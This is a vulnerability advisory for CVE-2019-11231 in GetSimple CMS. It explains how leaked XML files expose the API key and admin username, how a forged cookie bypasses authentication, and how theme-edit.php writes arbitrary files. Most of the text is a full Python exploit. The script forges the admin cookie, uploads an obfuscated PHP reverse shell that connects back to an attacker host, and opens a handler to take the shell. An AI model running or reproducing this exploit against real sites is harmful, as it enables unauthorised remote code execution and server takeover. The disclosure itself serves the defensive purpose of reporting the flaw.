**Vulnerabilities Summary**

The following advisory describes a vulnerability in GetSimple CMS which allows unauthenticated attackers to perform Remote Code Execution.

**CVE**

CVE-2019-11231

**Credit**

An independent Security Researcher, Steven Seeley, has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**

GetSimple CMS version 3.3.15 (Latest at the time of writing this post) and before.

**Vendor Response**

We have notified the vendor on the 21/1/2019 and sent few reminder emails but got no response from the vendor.

**Vulnerability Details**

An insufficient input sanitation is in the theme-edit.php file allows to upload files with arbitrary content (PHPcode for example). This vulnerability can be triggered by an authenticated user, however authentication can be bypassed.

According to the official installation documentation, specially, step 10, an admin is required to upload all the files, including the .htaccess files and run a health check.

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/01/health-check-1024x713.png">
However, what is overlooked is that Apache by default does not enable “allowoverride” directive anymore so we can expose passwords:

http://localhost/GetSimpleCMS-3.3.15/data/users/admin.xml

```
<item>
  <USR>admin</USR>
  <NAME>zo</NAME>
  <PWD>a94a8fe5ccb19ba61c4c0873d391e987982fbbd3</PWD>
  <EMAIL>pwning@zo</EMAIL>
  <HTMLEDITOR>1</HTMLEDITOR>
  <TIMEZONE/>
  <LANG>en_US</LANG>
</item>
```

The problem is that the passwords are hashed so we need a way to bypass this issue. We can access the API key in:

http://localhost/GetSimpleCMS-3.3.15/data/other/authorization.xml

```
<item>
  <apikey>44769f621e9b7db1bb19adbdf659b015</apikey>
</item>
```

What this allows us to do is target the session state, since they decided to roll their own implementation. Inside of admin/inc/configuration.php we see the following code:

```
$site_full_name     = 'GetSimple';
$site_version_no    = '3.3.15';
$name_url_clean     = lowercase(str_replace(' ','-',$site_full_name));
$ver_no_clean       = str_replace('.','',$site_version_no);
$site_link_back_url = 'http://get-simple.info/';
// cookie config
$cookie_name = lowercase($name_url_clean) .'_cookie_'. $ver_no_clean; // non-hashed name of cookie
```

The cookie_name is crafted information that can be leaked from the frontend (site name and version). Then, later in admin/inc/cookie_functions.php we can see the following code:

```php
/**
 * Check Login Cookie
 *
 * @since 1.0
 * @uses $cookie_login
 * @uses cookie_check
 * @uses redirect
 */
function login_cookie_check() {
    global $cookie_login;
    if(cookie_check()) {
        create_cookie();
    } else {
        $qstring = filter_queryString(array('id'));
        $redirect_url = $cookie_login.'?redirect='.myself(FALSE).'?'.$qstring;
        redirect($redirect_url);
    }
}

function cookie_check() {
    global $USR,$SALT,$cookie_name;
    $saltUSR = $USR.$SALT;
    $saltCOOKIE = sha1($cookie_name.$SALT);
    if(isset($_COOKIE[$saltCOOKIE])&&$_COOKIE[$saltCOOKIE]==sha1($saltUSR)) {
        return TRUE; // Cookie proves logged in status.
    } else {
        return FALSE;
    }
}

/**
 * Create Cookie
 *
 * @since 1.0
 * @uses $USR
 * @uses $SALT
 * @uses $cookie_time
 * @uses $cookie_name
 */
function create_cookie() {
  global $USR,$SALT,$cookie_time,$cookie_name;
  $saltUSR    = sha1($USR.$SALT);
  $saltCOOKIE = sha1($cookie_name.$SALT);
  gs_setcookie('GS_ADMIN_USERNAME', $USR);   
  gs_setcookie($saltCOOKIE, $saltUSR);
}

/**
 * set a gs cookie
 * @since  3.3.5
 * @param  str $id    cookie id
 * @param  str $value value of cookie
 * @return bool       true if headers not sent
 */
function gs_setcookie($id,$value){
    GLOBAL $cookie_time, $cookie_path, $cookie_domain, $cookie_secure, $cookie_httponly;

    $expire = time() + $cookie_time;
    // debugLog('set cookie: '.implode(',',array($id, $value, $cookie_time, $cookie_path, $cookie_domain, $cookie_secure, $cookie_httponly)));
    return setcookie($id, $value, $expire, $cookie_path, $cookie_domain, $cookie_secure, $cookie_httponly);
}

/**
 * Unset a gs cookie
 * @since  3.3.5
 * @param  str $id id of cookie
 * @return bool       true if headers not sent
 */
function gs_unsetcookie($id){
    GLOBAL $cookie_time, $cookie_path, $cookie_domain, $cookie_secure, $cookie_httponly;
    // debugLog('unset cookie: '.implode(',',array($id, false, $cookie_time, $cookie_path, $cookie_domain, $cookie_secure, $cookie_httponly)));
    return setcookie($id,false,1,$cookie_path,$cookie_domain,$cookie_secure, $cookie_httponly);
}
```

f someone leaks the API key (44769f621e9b7db1bb19adbdf659b015) and the admin username (admin) then they can bypass authentication. To do so, they need to supply a cookie that is set to:

sha1(getsimple_cookie_3315 + 44769f621e9b7db1bb19adbdf659b015) = sha1(admin + 44769f621e9b7db1bb19adbdf659b015)
Cookie: GS_ADMIN_USERNAME {username};sha1(getsimple_cookie_{cmsversion}{salt})=sha1({username}{salt});

The vulnerability exists in the admin/theme-edit.php file. This file checks for forms submissions via POST request and for the CSRF nonce passed. If the nonce sent is correct then the file provided by the user is uploaded.

```php
if((isset($_POST['submitsave']))){
    # check for csrf
    if (!defined('GSNOCSRF') || (GSNOCSRF == FALSE) ) {
        $nonce = $_POST['nonce'];
        if(!check_nonce($nonce,"save")){ die("CSRF detected!"); }
    }
    # save edited template file
    $SavedFile = $_POST['edited_file'];     
    $FileContents=get_magic_quotes_gpc()?stripslashes($_POST['content']):$_POST['content'];
    # [1]
    $fh = fopen(GSTHEMESPATH . $SavedFile, 'w') or die("can't open file");
    fwrite($fh, $FileContents);
    fclose($fh);
    $success = sprintf(i18n_r('TEMPLATE_FILE'), $SavedFile);
}
```

The vulnerability is a path traversal allowing to write outside the jailed themes directory root. However, we don’t even need it due to the .htaccess assumption, we can write into the same directory to gain a shell.

The other issue here is that there isn’t another check on the extension before saving the file. The file is being saved with the assumption that the parameter content is safe. This allows the creation of web accessible and executable files with arbitrary content.

**Exploit**

```python
import re
import sys
import socket
import hashlib
import requests
import telnetlib
from threading import Thread
from xml.etree import ElementTree

class gscms_pwner:

    def __init__(self, target, path, username, cb_host, cb_port):
        self.target  = target
        self.path    = path
        self.un      = username
        self.cb_host = cb_host
        self.cb_port = cb_port
        self.version = None
        self.apikey  = None

    def set_headers(self):
        self.h = {
            'Content-Type':'application/x-www-form-urlencoded',
            'Cookie': self.cookies
        }

    def set_cookies(self):
        self.cookies = "GS_ADMIN_USERNAME=%s;%s=%s" % (self.un, self.get_cookie_name(), self.get_cookie_value())
        self.set_headers()

    def get_cookie_name(self):
        cn = "getsimple_cookie_%s%s" % (self.version.replace(".", ""), self.apikey)
        sha1 = hashlib.sha1()
        sha1.update(cn)
        return sha1.hexdigest()

    def get_cookie_value(self):
        cv = "%s%s" % (self.un, self.apikey)
        sha1 = hashlib.sha1()
        sha1.update(cv)
        return sha1.hexdigest()

    def get_version(self):
        print "(+) fingerprinting the targets version"
        r = requests.get("http://%s%sadmin/index.php" % (self.target, self.path))
        match = re.search("jquery.getsimple.js\?v=(.*)\"", r.text)
        if match:
            self.version = match.group(1)
            print "(+) found version: %s" % self.version
            return True
        return False

    def check_htaccess(self):
        print "(+) checking .htaccess exposure..."
        r = requests.get("http://%s%sdata/other/authorization.xml" % (self.target, self.path))
        if r.ok:
            tree = ElementTree.fromstring(r.content)
            self.apikey = tree[0].text
            print "(+) leaked key: %s" % self.apikey
            return True
        return False

    def check_username_disclosure(self):
        print "(+) no username provided, attempting username leak..."
        r = requests.get("http://%s%sdata/users/" % (self.target, self.path))
        match = re.search("href=\"(.*).xml\"", r.text)
        if match:
            self.un = match.group(1)
            print "(+) found username: %s" % self.un
            return True
        return False

    def get_nonce(self):
        r = requests.get("http://%s%sadmin/theme-edit.php" % (self.target, self.path), headers=self.h)
        m = re.search('nonce" type="hidden" value="(.*)"', r.text)
        if m:
            print("(+) obtained csrf nonce: %s" % m.group(1))
            return m.group(1)
        return None

    def upload(self, fname, content):
            n = self.get_nonce()
            if n != None:
                try:
                    p = {
                        'submitsave': 2,
                        'edited_file': fname,
                        'content': content,
                        'nonce': n
                    }
                    r = requests.post("http://%s%sadmin/theme-edit.php" % (self.target, self.path), headers=self.h, data=p)
                    if 'CSRF detected!' not in r.text:
                        print('(+) shell uploaded to http://%s%stheme/%s' % (self.target, self.path, fname))
                        return True
                    else: print("(-) couldn't upload shell %s " % fname)
                except Exception as e:
                    print(e)
            return False

    # build the reverse php shell
    def build_php_code(self):
        phpkode  = ("""
        @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);""")
        phpkode += ("""$dis=@ini_get('disable_functions');""")
        phpkode += ("""if(!empty($dis)){$dis=preg_replace('/[, ]+/', ',', $dis);$dis=explode(',', $dis);""")
        phpkode += ("""$dis=array_map('trim', $dis);}else{$dis=array();} """)
        phpkode += ("""if(!function_exists('LcNIcoB')){function LcNIcoB($c){ """)
        phpkode += ("""global $dis;if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {$c=$c." 2>&1\\n";} """)
        phpkode += ("""$imARhD='is_callable';$kqqI='in_array';""")
        phpkode += ("""if($imARhD('popen')and!$kqqI('popen',$dis)){$fp=popen($c,'r');""")
        phpkode += ("""$o=NULL;if(is_resource($fp)){while(!feof($fp)){ """)
        phpkode += ("""$o.=fread($fp,1024);}}@pclose($fp);}else""")
        phpkode += ("""if($imARhD('proc_open')and!$kqqI('proc_open',$dis)){ """)
        phpkode += ("""$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); """)
        phpkode += ("""$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);} """)
        phpkode += ("""@proc_close($handle);}else if($imARhD('system')and!$kqqI('system',$dis)){ """)
        phpkode += ("""ob_start();system($c);$o=ob_get_contents();ob_end_clean(); """)
        phpkode += ("""}else if($imARhD('passthru')and!$kqqI('passthru',$dis)){ob_start();passthru($c); """)
        phpkode += ("""$o=ob_get_contents();ob_end_clean(); """)
        phpkode += ("""}else if($imARhD('shell_exec')and!$kqqI('shell_exec',$dis)){ """)
        phpkode += ("""$o=shell_exec($c);}else if($imARhD('exec')and!$kqqI('exec',$dis)){ """)
        phpkode += ("""$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else{$o=0;}return $o;}} """)
        phpkode += ("""$nofuncs='no exec functions'; """)
        phpkode += ("""if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ """)
        phpkode += ("""$s=@fsockopen('tcp://%s','%d');while($c=fread($s,2048)){$out = ''; """ % (self.cb_host, self.cb_port))
        phpkode += ("""if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
        phpkode += ("""}elseif (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'){break;}else{ """)
        phpkode += ("""$out=LcNIcoB(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs); """)
        phpkode += ("""break;}}fwrite($s,$out);}fclose($s);}else{ """)
        phpkode += ("""$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,'%s','%d'); """ % (self.cb_host, self.cb_port))
        phpkode += ("""@socket_write($s,"socket_create");while($c=@socket_read($s,2048)){ """)
        phpkode += ("""$out = '';if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
        phpkode += ("""} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { """)
        phpkode += ("""break;}else{$out=LcNIcoB(substr($c,0,-1));if($out===false){ """)
        phpkode += ("""@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out)); """)
        phpkode += ("""}@socket_close($s);} """)
        return phpkode

    def handler(self):
        print "(+) starting handler on port %d" % self.cb_port
        t = telnetlib.Telnet()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", self.cb_port))
        s.listen(1)
        conn, addr = s.accept()
        print "(+) connection from %s" % addr[0]
        t.sock = conn
        print "(+) pop thy shell!"
        t.interact()

    def exec_code(self):
        handlerthr = Thread(target=self.handler)
        handlerthr.start()
        requests.get("http://%s/%s/theme/poc.php" % (self.target, self.path))

    def exploit(self):
        print "(+) targeting: http://%s%s" % (self.target, self.path)
        if self.get_version():
            if self.check_htaccess():
                if self.un == None:
                    # requires directory listing
                    self.check_username_disclosure()
                self.set_cookies()
                self.upload('poc.php', "<?php %s" % self.build_php_code())
                print "(+) triggering connectback to: %s:%d" % (self.cb_host, self.cb_port)
                self.exec_code()
        else:
            print "(-) invalid target uri!"
            sys.exit(-1)

def main():
    if len(sys.argv) < 4:
        print "(+) usage: %s <target> <path> <connectback:port> [username]" % sys.argv[0]
        print "(+) eg: %s 172.16.175.156 /" % sys.argv[0]
        print "(+) eg: %s 172.16.175.156 /GetSimpleCMS-3.3.15/ 172.16.175.1:909" % sys.argv[0]
        print "(+) eg: %s 172.16.175.156 /GetSimpleCMS-3.3.15/ 172.16.175.1:909 admin" % sys.argv[0]
        sys.exit(1)
    t = sys.argv[1]
    p = sys.argv[2]
    if not p.endswith("/"):
        p += "/"
    if not p.startswith("/"):
        p = "/%s" % p
    if ":" not in sys.argv[3]:
        cb_port = 4444
        cb_host = sys.argv[3]
    else:
        cb_port = sys.argv[3].split(":")[1]
        cb_host = sys.argv[3].split(":")[0]
        if not cb_port.isdigit():
            cb_port = 4444
        else:
            cb_port = int(cb_port)
    u = None
    if len(sys.argv) == 5:
        u = sys.argv[4]
    gp = gscms_pwner(t, p, u, cb_host, cb_port)
    gp.exploit()

if __name__ == '__main__':
    main()
```

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/01/poc-1024x580.png">
